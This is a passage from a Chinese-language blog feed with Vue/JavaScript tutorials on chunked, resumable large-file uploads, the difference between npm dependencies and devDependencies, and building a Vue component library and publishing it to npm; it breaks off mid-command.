<span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line"></span><br><span class="line">+     <span class="keyword">const</span> &#123; shouldUpload, uploadedList &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">      );</span><br><span class="line">      <span class="keyword">if</span> (!shouldUpload) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$message</span>.<span class="title function_">success</span>(<span class="string">&quot;秒传：上传成功&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;, index</span>) =&gt;</span> (&#123;</span><br><span class="line">        <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">        index,</span><br><span class="line">        <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> + <span class="string">&quot;-&quot;</span> + index,</span><br><span class="line">        <span class="attr">chunk</span>: file，</span><br><span class="line">        <span class="attr">percentage</span>: <span class="number">0</span></span><br><span class="line">      &#125;));</span><br><span class="line"></span><br><span class="line">+      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>(uploadedList);</span><br><span class="line">    &#125;,</span><br><span class="line">   <span class="comment">// 上传切片，同时过滤已上传的切片</span></span><br><span class="line">+   <span class="keyword">async</span> <span class="title function_">uploadChunks</span>(<span class="params">uploadedList = []</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> requestList = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">+        .<span class="title function_">filter</span>(<span class="function">(<span class="params">&#123; hash &#125;</span>) =&gt;</span> !uploadedList.<span class="title function_">includes</span>(hash))</span><br><span class="line">        .<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; chunk, hash, index &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">          formData.<span class="title function_">append</span>(<span class="string">&quot;chunk&quot;</span>, chunk);</span><br><span class="line">          formData.<span class="title function_">append</span>(<span class="string">&quot;hash&quot;</span>, hash);</span><br><span class="line">          formData.<span class="title function_">append</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>);</span><br><span class="line">          formData.<span class="title function_">append</span>(<span class="string">&quot;fileHash&quot;</span>, <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>);</span><br><span class="line">          <span class="keyword">return</span> &#123; formData, index &#125;;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">map</span>(<span class="keyword">async</span> (&#123; formData, index &#125;) =&gt;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: formData,</span><br><span class="line">            <span class="attr">onProgress</span>: <span class="variable language_">this</span>.<span class="title function_">createProgressHandler</span>(<span class="variable language_">this</span>.<span class="property">data</span>[index]),</span><br><span class="line">            <span class="attr">requestList</span>: <span class="variable language_">this</span>.<span class="property">requestList</span></span><br><span class="line">          &#125;)</span><br><span class="line">        );</span><br><span class="line">      <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(requestList);</span><br><span class="line">      <span class="comment">// 之前上传的切片数量 + 本次上传的切片数量 = 所有切片数量时</span></span><br><span class="line">      <span class="comment">// 合并切片</span></span><br><span class="line">+      <span class="keyword">if</span> (uploadedList.<span class="property">length</span> + requestList.<span class="property">length</span> === <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">length</span>) &#123;</span><br><span class="line">         <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">mergeRequest</span>();</span><br><span class="line">+      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-gold-cdn.xitu.io/2020/1/9/16f890e598de0946?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="image-20200109144331326"></p><p>这里给原来上传切片的函数新增 uploadedList 参数，即上图中服务端返回的切片名列表，通过 filter 过滤掉已上传的切片，并且由于新增了已上传的部分，所以之前合并接口的触发条件做了一些改动</p><p>到这里断点续传的功能基本完成了</p><h2 id="进度条改进"><a href="#进度条改进" class="headerlink" title="进度条改进"></a>进度条改进</h2><p>虽然实现了断点续传，但还需要修改一下进度条的显示规则，否则在暂停上传&#x2F;接收到已上传切片时的进度条会出现偏差</p><h3 id="切片进度条-1"><a href="#切片进度条-1" class="headerlink" title="切片进度条"></a>切片进度条</h3><p>由于在点击上传&#x2F;恢复上传时，会调用验证接口返回已上传的切片，所以需要将已上传切片的进度变成 100%</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line">      <span class="keyword">const</span> &#123; shouldUpload, uploadedList &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span></span><br><span class="line">      );</span><br><span class="line">      <span class="keyword">if</span> (!shouldUpload) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$message</span>.<span class="title function_">success</span>(<span class="string">&quot;秒传：上传成功&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;, index</span>) =&gt;</span> (&#123;</span><br><span class="line">        <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">        index,</span><br><span class="line">        <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> + <span class="string">&quot;-&quot;</span> + index,</span><br><span class="line">        <span class="attr">chunk</span>: file,</span><br><span class="line">+       <span class="attr">percentage</span>: uploadedList.<span class="title function_">includes</span>(index) ? <span class="number">100</span> : <span class="number">0</span></span><br><span class="line">      &#125;));</span><br><span class="line">      <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>(uploadedList);</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>uploadedList 会返回已上传的切片，在遍历所有切片时判断当前切片是否在已上传列表里即可</p><h3 id="文件进度条-1"><a href="#文件进度条-1" class="headerlink" title="文件进度条"></a>文件进度条</h3><p>之前说到文件进度条是一个计算属性，根据所有切片的上传进度计算而来，这就遇到了一个问题</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/9/16f8845dcca1427c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>点击暂停会取消并清空切片的 xhr 请求，此时如果已经上传了一部分，就会发现文件进度条有<code>倒退</code>的现象</p><p><img src="https://user-gold-cdn.xitu.io/2020/1/9/16f884633f3acfd9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>当点击恢复时，由于重新创建了 xhr 导致切片进度清零，所以总进度条就会倒退</p><p>解决方案是创建一个“假”的进度条，这个假进度条基于文件进度条，但只会停止和增加，然后给用户展示这个假的进度条</p><p>这里我们使用 Vue 的监听属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  <span class="attr">data</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">+    <span class="attr">fakeUploadPercentage</span>: <span class="number">0</span></span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="title function_">uploadPercentage</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span> || !<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">length</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">const</span> loaded = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">        .<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">size</span> * item.<span class="property">percentage</span>)</span><br><span class="line">        .<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> acc + cur);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">parseInt</span>((loaded / <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">size</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,  </span><br><span class="line">  <span class="attr">watch</span>: &#123;</span><br><span class="line">+    <span class="title function_">uploadPercentage</span>(<span class="params">now</span>) &#123;</span><br><span class="line">+      <span class="keyword">if</span> (now &gt; <span class="variable language_">this</span>.<span class="property">fakeUploadPercentage</span>) &#123;</span><br><span class="line">+        <span class="variable language_">this</span>.<span class="property">fakeUploadPercentage</span> = now;</span><br><span class="line">+      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>当 uploadPercentage 即真的文件进度条增加时，fakeUploadPercentage 也增加，一旦文件进度条后退，假的进度条只需停止即可</p><p>至此一个大文件上传 + 断点续传的解决方案就完成了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>大文件上传</p><ul><li>前端上传大文件时使用 Blob.prototype.slice 将文件切片，并发上传多个切片，最后发送一个合并的请求通知服务端合并切片</li><li>服务端接收切片并存储，收到合并请求后使用流将切片合并到最终文件</li><li>原生 XMLHttpRequest 的 upload.onprogress 对切片上传进度的监听</li><li>使用 Vue 计算属性根据每个切片的进度算出整个文件的上传进度</li></ul><p>断点续传</p><ul><li>使用 spark-md5 根据文件内容算出文件 hash</li><li>通过 hash 可以判断服务端是否已经上传该文件，从而直接提示用户上传成功（秒传）</li><li>通过 XMLHttpRequest 的 abort 方法暂停切片的上传</li><li>上传前服务端返回已经上传的切片名，前端跳过这些切片的上传</li></ul><hr><p><strong>原文来自<a href="https://juejin.cn/post/6844904046436843527">yeyan1996</a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;服务端&quot;&gt;&lt;a href=&quot;#服务端&quot; class=&quot;headerlink&quot; title=&quot;服务端&quot;&gt;&lt;/a&gt;服务端&lt;/h3&gt;&lt;p&gt;服务端需要负责接受这些切片，并在接收到所有切片后&lt;code&gt;合并&lt;/code&gt;切片&lt;/p&gt;
&lt;p&gt;这里又引伸出两个问题&lt;/p&gt;
&lt;o</summary>
      
    
    
    
    <category term="小功能" scheme="https://hisai3.github.io/hisai3.github.io/categories/%E5%B0%8F%E5%8A%9F%E8%83%BD/"/>
    
    
    <category term="javascript" scheme="https://hisai3.github.io/hisai3.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>dependencies和devDependencies的区别</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/31/dependencies%E5%92%8CdevDependencies%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/31/dependencies%E5%92%8CdevDependencies%E7%9A%84%E5%8C%BA%E5%88%AB/</id>
    <published>2023-01-31T03:21:31.000Z</published>
    <updated>2023-02-03T06:05:04.579Z</updated>
    
    <content type="html"><![CDATA[<ul><li>dependencies：项目依赖。在编码阶段和呈现页面阶段都需要的，也就是说，项目依赖即在开发环境中，又在生产环境中。如js框架vue、页面路由vue-router，各种ui框架antd、element-ui、vant等。</li><li>devDependencies: 开发依赖。仅仅在写代码过程中需要使用，比如css预处理器、vue-cli脚手架、eslint之类。</li><li>后面部分为–save -dev 的情况会使得下载的插件放在package.json文件的devDpendencies对象里面</li><li>后面部分为–save的情况会使得下载的插件放在package.json文件的dependencies对象里面</li></ul><p>区别</p><ul><li>devDependencies下的依赖包，只是我们在本地或开发坏境下运行代码所依赖的，若发到线上，其实就不需要devDependencies下的所有依赖包；(比如各种loader，babel全家桶及各种webpack的插件等)只用于开发环境，不用于生产环境，因此不需要打包；</li><li>dependencies是我们线上(生产坏境)下所要依赖的包，比如vue，我们线上时必须要使用的，所以要放在dependencies下；dependencies依赖的包不仅开发环境能使用，生产环境也能使用</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;dependencies：项目依赖。在编码阶段和呈现页面阶段都需要的，也就是说，项目依赖即在开发环境中，又在生产环境中。如js框架vue、页面路由vue-router，各种ui框架antd、element-ui、vant等。&lt;/li&gt;
&lt;li&gt;devDepend</summary>
      
    
    
    
    
    <category term="npm" scheme="https://hisai3.github.io/hisai3.github.io/tags/npm/"/>
    
  </entry>
  
  <entry>
    <title>自定义组件库，本地调试 + 发布到npm</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/31/%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6%E5%BA%93%EF%BC%8C%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95%20+%20%E5%8F%91%E5%B8%83%E5%88%B0npm/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/31/%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6%E5%BA%93%EF%BC%8C%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95%20+%20%E5%8F%91%E5%B8%83%E5%88%B0npm/</id>
    <published>2023-01-31T02:21:31.000Z</published>
    <updated>2023-01-31T06:05:26.692Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、-建立一个用来打包编译的工程plugin-generator-system"><a href="#一、-建立一个用来打包编译的工程plugin-generator-system" class="headerlink" title="一、 建立一个用来打包编译的工程plugin-generator-system"></a>一、 建立一个用来打包编译的工程plugin-generator-system</h2><ol><li><strong>安装脚手架</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save vue-cli</span><br></pre></td></tr></table></figure><ol start="2"><li><p>新建 <strong>plugin-generator-system</strong> 文件夹</p></li><li><p><strong>初始化工程</strong></p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue init webpack-simple</span><br></pre></td></tr></table></figure><p>生成的工程目录如下：</p><p><img src="https://gitee.com/hisai/image-bed/raw/master/hexo-blog/simple-init-mulu.png" alt="simple-init-mulu"></p><ol start="4"><li>安装依赖</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i</span><br></pre></td></tr></table></figure><h2 id="二、新建一个组件，并修改相关配置"><a href="#二、新建一个组件，并修改相关配置" class="headerlink" title="二、新建一个组件，并修改相关配置"></a>二、新建一个组件，并修改相关配置</h2><p>在 <strong>src</strong> 下新建 <strong>hello.vue</strong> 和 <strong>index.js</strong> </p><p><code>hello.vue</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;hello-template&quot;&gt;</span><br><span class="line">    hello world, this is plugin pack, user is &#123;&#123; user &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;hello&#x27;,</span><br><span class="line">  props: &#123;</span><br><span class="line">    user: &#123;</span><br><span class="line">      type: String,</span><br><span class="line">      default: &#x27;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.hello-template &#123;</span><br><span class="line">  color: chocolate;</span><br><span class="line">  font-size: medium;</span><br><span class="line">  font-family: Consolas;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><code>index.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Hello</span> <span class="keyword">from</span> <span class="string">&#x27;./hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> components = &#123;</span><br><span class="line">  <span class="title function_">install</span>(<span class="params">Vue, options</span>) &#123;</span><br><span class="line">    <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;hzHello&#x27;</span>, <span class="title class_">Hello</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">window</span> !== <span class="string">&#x27;undefined&#x27;</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">Vue</span>) &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">Vue</span>.<span class="title function_">use</span>(components)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> components</span><br></pre></td></tr></table></figure><p>修改<strong>package.json</strong>和<strong>webpack.config.js</strong>文件</p><p><code>package.json</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;plugin-generator-system&quot;</span><span class="punctuation">,</span> <span class="comment">// 发布的模块名称，发布线上后，可以通过npm install xx来引用该模块，一般Vue组件以vue-开头</span></span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.1&quot;</span><span class="punctuation">,</span> <span class="comment">// 更新时需要修改版本号</span></span><br><span class="line"><span class="attr">&quot;private&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="comment">// 打包后的入口文件，若不配置，则在其他项目中就无法使用import xx from &#x27;包名&#x27;来引入组件，只能以包名作为起点来指定相对路径</span></span><br><span class="line"><span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist/hz-components-ui.min.js&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;dist&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;keywords&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;hz-compontents&quot;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p><code>webpack.config.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">entry</span>: <span class="string">&#x27;./src/lib/index.js&#x27;</span>,</span><br><span class="line"><span class="attr">output</span>: &#123;</span><br><span class="line">   <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./dist&#x27;</span>),</span><br><span class="line">   <span class="attr">publicPath</span>: <span class="string">&#x27;/dist/&#x27;</span>,</span><br><span class="line">   <span class="attr">filename</span>: <span class="string">&#x27;hz-components-ui.min.js&#x27;</span>, <span class="comment">// 生成的文件名</span></span><br><span class="line">   <span class="attr">library</span>: <span class="string">&#x27;hzComponentsUi&#x27;</span>, <span class="comment">// 指定使用require时的模块名，此处就是require(&#x27;helloWord&#x27;)</span></span><br><span class="line">   <span class="attr">libraryTarget</span>: <span class="string">&#x27;umd&#x27;</span>, <span class="comment">// 指定不同的umd代码</span></span><br><span class="line">   <span class="attr">umdNamedDefine</span>: <span class="literal">true</span> <span class="comment">// 对umd的构建过程中的amd模块进行命名</span></span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><h2 id="三、-编译打包输出"><a href="#三、-编译打包输出" class="headerlink" title="三、 编译打包输出"></a>三、 编译打包输出</h2><ol><li><p><strong>npm run build</strong></p></li><li><p><strong>npm pack</strong></p></li></ol><p>结果如下：</p><p><img src="https://gitee.com/hisai/image-bed/raw/master/hexo-blog/simple-init-build.png" alt="simple-init-build"></p><h2 id="四、-在其他项目中使用上一步输出的包plugin-generator-system-1-0-0-tgz"><a href="#四、-在其他项目中使用上一步输出的包plugin-generator-system-1-0-0-tgz" class="headerlink" title="四、 在其他项目中使用上一步输出的包plugin-generator-system-1.0.0.tgz"></a>四、 在其他项目中使用上一步输出的包plugin-generator-system-1.0.0.tgz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i F:\Code\plugin-generator-system\plugin-generator-system-1.0.0.tgz</span><br></pre></td></tr></table></figure><p>安装成功后，<strong>node_modules</strong>和<strong>package.js</strong>会发生改变：</p><p><img src="https://gitee.com/hisai/image-bed/raw/master/hexo-blog/simple-init-plugin.png" alt="simple-init-plugin"></p><ol><li>main.js中引入</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> components <span class="keyword">from</span> <span class="string">&#x27;plugin-generator-system&#x27;</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(components)</span><br></pre></td></tr></table></figure><ol start="2"><li>页面中使用</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">hz-hello</span> <span class="attr">user</span>=<span class="string">&quot;hahahaha&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">hz-hello</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="五、-最后的效果"><a href="#五、-最后的效果" class="headerlink" title="五、 最后的效果"></a>五、 最后的效果</h2><p><img src="https://gitee.com/hisai/image-bed/raw/master/hexo-blog/simple-init-res.png" alt="simple-init-res"></p><h2 id="六-本地开发调式组件"><a href="#六-本地开发调式组件" class="headerlink" title="六. 本地开发调式组件"></a>六. 本地开发调式组件</h2><p>修改<strong>webpack.config</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将组件打包配置抽离</span></span><br><span class="line"><span class="keyword">const</span> proConfig = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&#x27;./src/lib/index.js&#x27;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./dist&#x27;</span>),</span><br><span class="line">    <span class="attr">publicPath</span>: <span class="string">&#x27;/dist/&#x27;</span>,</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&#x27;hz-components-ui.min.js&#x27;</span>,</span><br><span class="line">    <span class="attr">library</span>: <span class="string">&#x27;hzComponentsUi&#x27;</span>,</span><br><span class="line">    <span class="attr">libraryTarget</span>: <span class="string">&#x27;umd&#x27;</span>,</span><br><span class="line">    <span class="attr">umdNamedDefine</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据环境使用</span></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    ...<span class="variable language_">module</span>.<span class="property">exports</span>,</span><br><span class="line">    ...proConfig</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="七、-发布到npm"><a href="#七、-发布到npm" class="headerlink" title="七、 发布到npm"></a>七、 发布到npm</h2><ol><li><strong>新建文件 .npmignore 写入一些不必要上传的文件名称</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">node_modules/</span><br><span class="line">examples/</span><br><span class="line">public/</span><br><span class="line">packages/</span><br><span class="line">vue.config.js</span><br><span class="line">babel.config.js</span><br><span class="line">*.map</span><br><span class="line">*.html</span><br><span class="line"> </span><br><span class="line"># local env files</span><br><span class="line">.env.local</span><br><span class="line">.env.*.local</span><br><span class="line"> </span><br><span class="line"># Log files</span><br><span class="line">npm-debug.log*</span><br><span class="line">yarn-debug.log*</span><br><span class="line">yarn-error.log*</span><br><span class="line"> </span><br><span class="line"># Editor directories and files</span><br><span class="line">.idea</span><br><span class="line">.vscode</span><br><span class="line">*.suo</span><br><span class="line">*.ntvs*</span><br><span class="line">*.njsproj</span><br><span class="line">*.sln</span><br><span class="line">*.sw*</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>打包编译</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>确认npm镜像 是否为发布 <a href="https://registry.npmjs.org/">https://registry.npmjs.org/</a></strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm get 